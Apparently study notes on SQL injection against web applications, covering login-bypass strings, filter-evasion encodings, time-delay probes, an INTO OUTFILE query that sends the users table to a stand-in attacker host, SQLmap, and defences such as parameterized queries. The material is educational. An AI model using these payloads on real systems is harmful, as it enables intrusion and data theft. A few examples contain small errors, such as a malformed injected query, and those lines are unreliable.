## Data Stores

- some sort of data storage technology
  - SQL Databases
  - XML Based Repositories
  - LDAP Directories

The data stored is managed by some query language that contains internal logic on how to access the structured format

- Most web applications use an interpreted language, meaning that they are **not precompiled** and use an **interpreter** to process the code (instructions) provided
- SQL, LDAP, Perl, PHP – all use an interpreter… meaning that they have a mix of instructions, some created by the programmer, and some data supplied by the user of the application

- If an attacker can successfully inject instructions into the data component, they can have the interpreter execute instructions that only the programmer should have done originally
- Injections with interpreters work differently than those with pre-compiled programs because they do not have to be changed to machine language, **only the interpreter language** such as SQL

- Data Stores are accessed by the web application logic created by the programmer(s)
- Vulnerabilities are formed when an application uses insecure values to create queries
- **Penetration testing** involves:
  - Injecting unexpected **syntax**
  - **Identifying anomalies** in the server’s response
  - Examining any **error messages** received

## SQL Injection

- SQL Injection

  - The ability to inject SQL commands into the database engine through an existing application

- SQL Injection is not a problem with the database management system

  - It is a problem with the way that **an application supplies user data** to SQL queries
  - Most SQL queries use user supplied data to perform their searches (queries) of a database

- Modern web applications typically use a database and a variation of the Structured Query Language (SQL) to retrieve, modify, add, and delete data stored in the database
- Most common database management systems:

  - Oracle
  - MS-SQL
  - MySQL

- Basic attacks try to terminate a SQL query with the use of a **single quotation mark** (`'`)

### 1=1 attack

- These attacks typically focus on authentication systems
  - An attack could add a user to the table or create a new price for the item (data tampering)

```sql
SELECT product,price FROM items WHERE for_sale=1
-- attacker: ' OR 1=1 --
SELECT product,price FROM items' OR 1=1 -- WHERE for_sale=1
```

### Attack Hazards

- Bypass Login Page
- Manipulate database data (steal, modify, delete)
- Create a database back door
- Read and Write files
- Execute system commands
- Distribute Trojans / Malware

---

### HTML Forms

- Many web applications take user input from HTML forms

  - Often this user input is used literally in the construction of a SQL query submitted to a database

- Common vulnerable login query (application)

```sql
SELECT * FROM users
WHERE name = 'ryan'
AND password = 'ginger'
-- (If this query returns something then login!)
```

- ASP/MS SQL Server login syntax

```sql
var sql = "SELECT * FROM users WHERE name = '"
+ form_name
+ "' AND password = '"
+ form_password + "'";
```

---

- Injections through Strings
  - form_user = `' or 1=1; – –`
  - form_password

```sql
SELECT * FROM users
WHERE username = ' ' or 1=1; --AND password = 'anything';
```

---

### Injecting String fields

- Quotes are used to close string parameters

- Everything after the quotes is part of the SQL command
- Misleading Internet suggestions include:

  - Just Escape it! : replace `'` with `"` or `' '`

- String fields are common but there are other types of fields:
  - Numeric
  - Dates
  - Pull down lists
  - Radio buttons

---

### Malicious Input

- Use quotes (`'` or `"`) in input to **escape from the string** and get into the query space
  - Once in query space, the query can be modified arbitrarily
- Double-hyphen (`--`) or hash (`#`) allows existing SQL to be **commented** out
- Semicolon (`;`) enables tacking on an entirely new statement
- Further modifying the database once an attacker is in

---

### SQL injection flaws

- exist across multistage processes

  - Submitting data may be split apart between different input fields and numerous web pages
  - Ensure that you submit injection data into the various pages to construct your full injection string
  - The Web App may be gathering data across numerous pages

- You may receive errors through JavaScript (or similar scripts) responses when providing input
- Try to submit **SQL wildcard characters** such as the `%` character in any parameter
- If there is a sign that the web application is **passing this to a SQL query,** it may indicate that the application has an injection vulnerability

---

### Advanced SQL Injection

- In order to attempt advanced SQL injection attacks, you may need to fingerprint the database first

  - Advanced attacks may require specific syntax depending on the type of back-end databased being used by the applicatio

- inject the string: `Administrator`

  - Oracle: `'Admin' || 'istrator'`
  - MS-SQL: `'Admin'+'istrator'`
  - MySQL: `'Admin' 'istrator'`

- Some applications may **block** SQL specific characters

  - **ASCII codes** for individual characters may be used to avoid such filters
  - `SELECT name, number FROM table WHERE name=CHAR(65)+CHAR(114)+CHAR(116)`

- If simple **validation** is being used, such as removing the SELECT statement, try **circumventing** the input validation by entering random bypasses

```txt
SeLeCt
%00SELECT
%53%45%4C%45%43%54
```

---

#### Second-Order SQL Injection

- These types of attacks can occur when an application handles public facing data insertion properly but **later processes** that data in an unsafe manner
- A back-end process may use a **high-privilege** database account to process data already stored in the database

---

- If **string** inputs are being handled properly by the application, try injecting into **other fields** such as numeric inputs
- Depending on the database management system being used, you may have to construct your injection characters specific to the database software being used

---

#### Out-of-Band Channels

- Certain database applications such as MS-SQL, Oracle, and MySQL have commands that can **establish a connection to a target computer**
- These can be used to send arbitrary data back to the attacking system
- The SQL strings injected into a vulnerable application can construct the required SQL code

```sql
SELECT * INTO OUTFILE
'\\\your_attacking_pc.com\\share\output.txt'
FROM users;
--  If you have a SMB share on the target PC set up to allow write from anonymous sources, the SQL query output will be written to the file specified
```

---

#### Time Delays

- Time Delays

  - These can be used to enumerate data stored in a database
  - If the application waits for the time specified in the query, a condition may be TRUE

- For example:
  - `If user = 'art' WAITFOR DELAY '0:0:5';`
  - If the application waits for 5 seconds before responding, then the condition was TRUE

---

#### Escalating Database Attacks

- If you have managed to own the web application database, there are further attacks that can be carried out
- **Obtain access to other databases** used by other applications on the same shared server
- **Compromise the Operating System** of the database server

- Obtain access to **other network** resources connected to the exploited database server
- Make network connections back to the attacking computer for the purpose of **data exfiltration**
- Adjusting functionality that may have been originally disabled when hardening the system

---

## SQL Mapping

- `SQL Mapping`

  - Automated SQL Injection Tool: SQLmap

- Sqlmap is a popular tool preinstalled on Kali Linux to launch database attacks

  - It has the ability to **attack** MySQL, Oracle, or MSSQL database systems
  - It implements UNION-based and inference based **data retrieval**

---

- SQL Mapping uses SQL injection vulnerabilities to **map out the contents** of a database
- The SQL Map tool on Kali Linux has the ability to:

  - Dump the **databases** on a server
  - Dump the **tables** in a database
  - Dump the **contents** of the tables

- SQLmap now has the ability to **directly connect** to a database without using SQL injection
- SQLmap is a built in tool in Kali Linux but you have the option of downloading it directly from:

  - `sqlmap.org`
  - There are a lot of different SQL injection options available with this tool

---

## Preventing SQL Injection

- **Escaping SQL characters** such as the single quote
- Safely escaping **second-order queries**
- Using **stored procedures**

  - These may not always be effective, especially if an attack can craft a SQL statement that is injected into an unsafe stored procedure or used by the application in another query

---

### Parameterized Queries

- Most database application development platforms provide **API’s** that are capable of handling user input in a secure way
- The application specifies the query **structure with placeholders** for each user input provided
- The application specifies the content of each placeholder
- Because the API handles any data supplied by a user in a safe manner, it cannot interfere with the actual query structure
- **Parameterized queries** should be used for **EVERY** database query
- Sometimes developers use their judgement on what data is coming from trusted/untrusted sources
- Any time that user supplied data specifies a table or column name, ensure that these bits of data are **properly validated** (whitelisted)
- Placeholders should not be used in any other parts of the query (such as ASC or DESC values)

---

### Reducing Access

- Different user accounts can be used depending on the actions being performed in a database

  - For example, a specific page that queries a database and returns values, could only use a database account that has Read/Write permissions

- If there is **no requirement** for a function to have the ability to delete data/tables/databases etc., this functionality should be **disabled**
- Any **security patches** should be installed in a timely manner to avoid potential vulnerabilities in database management systems
